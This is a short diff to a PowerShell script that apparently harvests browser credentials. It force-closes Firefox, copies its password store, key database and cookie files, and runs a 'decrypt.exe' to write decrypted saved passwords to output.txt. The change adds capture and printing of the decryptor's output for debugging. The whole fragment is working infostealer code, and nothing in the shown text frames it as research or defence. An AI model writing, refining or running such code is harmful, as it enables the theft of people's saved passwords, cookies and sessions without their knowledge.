@@ -59,7 +59,6 @@ if ($firefoxProfile) {
     $firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
     KillBrowserProcesses "firefox"
     CopyBrowserFiles "Firefox" $firefoxDir $firefoxFilesToCopy
-    # Local State for Firefox is not applicable; just copying Login Data files
 } else {
     Write-Host "Firefox - No profile found."
 }
@@ -85,8 +84,9 @@ $outputPath = Join-Path -Path $destDir -ChildPath "output.txt"
 if (Test-Path $decryptExePath) {
     if (Test-Path $loginDataPath) {
         if (Test-Path $localStatePath) {
-            # Run the decrypt.exe with specified parameters
-            & $decryptExePath $loginDataPath $localStatePath $outputPath
+            # Run the decrypt.exe with specified parameters and capture output
+            $result = & $decryptExePath $loginDataPath $localStatePath $outputPath 2>&1
+            Write-Host "Decrypt.exe output: $result"  # Write the output for debugging
             
             if (Test-Path $outputPath) {
                 Write-Host "Decrypted passwords saved to: $outputPath"
